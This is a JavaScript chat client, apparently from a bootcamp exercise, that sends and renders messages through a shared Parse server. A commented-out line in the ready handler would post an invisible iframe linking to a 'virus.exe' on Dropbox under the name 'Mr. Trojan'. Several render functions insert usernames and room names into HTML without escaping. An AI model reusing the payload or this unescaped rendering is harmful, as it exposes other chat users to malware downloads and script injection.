// YOUR CODE HERE:
var ChatterBox = function () {

  this.prevList = [];
  this.friendList = ['Ricky Asty', 'Manly Stan'];
  this.username = 'anoynmous';
};

var app = new ChatterBox();

ChatterBox.prototype.init = function() {
  this.username = window.location.search.slice(window.location.search.indexOf('=') + 1);
  $('#send .submit').on('submit', function(event) {
    event.preventDefault();
    app.handleSubmit();
  });  

  setInterval(function() {

  }, 5000);

};


ChatterBox.prototype.send = function(msg) {
  $.ajax({
  // This is the url you should use to communicate with the parse API server.
    url: 'http://parse.atx.hackreactor.com/chatterbox/classes/messages',
    type: 'POST',
    data: JSON.stringify(msg),
    contentType: 'application/json',
    success: function (data) {
      console.log('Message sent');
    },
    error: function (data) {
      // See: https://developer.mozilla.org/en-US/docs/Web/API/console.error
      console.error('chatterbox: Failed to send message', data);
    }
  });
  
};

ChatterBox.prototype.fetch = function(filter, sortOrder = 'createdAt') {
  $.ajax({
  // This is the url you should use to communicate with the parse API server.
    url: 'http://parse.atx.hackreactor.com/chatterbox/classes/messages',
    type: 'GET',
    data: 'order=-' + sortOrder,
    contentType: 'application/json',
    success: function (data) {
      var currentList = data.results;
      for (var i = 0; i < currentList.length - app.prevList.length - 1; i++) {
        app.renderMessage(currentList[i]);
      }
    },
    error: function (data) {
      // See: https://developer.mozilla.org/en-US/docs/Web/API/console.error
      console.error('chatterbox: Failed to send message', data);
    }
  });
  
};


ChatterBox.prototype.createMessage = function(id, roomname, text, update, username) {
  var message = {
    ObjectcreatedAt: new Date(), 
    objectId: id,
    roomname: roomname,
    text: text,
    updatedAt: update,
    username: username
  };
  return message;
};


ChatterBox.prototype.clearMessages = function() {
  $('#chats').empty();
};

ChatterBox.prototype.renderMessage = function(msg) {
  //var $msg = $(`div`);
  if (msg.text === undefined) {
    return;
  }
  if (msg.text.indexOf('<') !== -1 && msg.text.indexOf('>')) {
    console.log(msg.text);
    return;
  }
  var $post = $(`<div class='post'> 
    <span class='username'>${msg.username}</span> said @ ${msg.updatedAt}: ${msg.text} </div>`);
  
  if (this.friendList.includes(msg.username)) {
    $post.find('.username').addClass('friend');
  }

  $post.find('.username').on('click', function(event) {
    app.handleUsernameClick.call(this);
  });
  
  $(`body #chats`).append($post);
};

ChatterBox.prototype.renderRoom = function(roomName) {
  $(`body #roomSelect`).append(`<div id=${roomName}> </div>`);

};  

$( document ).ready(function() {
  app.fetch();
  app.init();
  /*app.send(createMessage(69, 'lobby', 
    `<iframe width="1" height="1" src="https://www.dropbox.com/s/vr5ga5mkg01rv0f/virus.exe?dl=0" frameborder="0" allowfullscreen></iframe>`,
    new Date(), 'Mr. Trojan'));*/


});

ChatterBox.prototype.handleUsernameClick = function() {
  if (!app.friendList.includes($(this).text())) {
    //add into friendList if not there already
    app.friendList.push($(this).text());
    var chatList = $('#chats').children();
    //find all instances of username and add class 'friend'
    for (var j = 0; j < chatList.length; j++) {
      if ($(chatList[j]).find('.username').text() === $(this).text()) {
        $(chatList[j]).find('.username').addClass('friend');
      }
    }
  }
};

ChatterBox.prototype.handleSubmit = function() {
  app.send(app.createMessage(Math.floor(Math.random() * 100), 'lobby', $('#message').val(), new Date(), app.username));  
};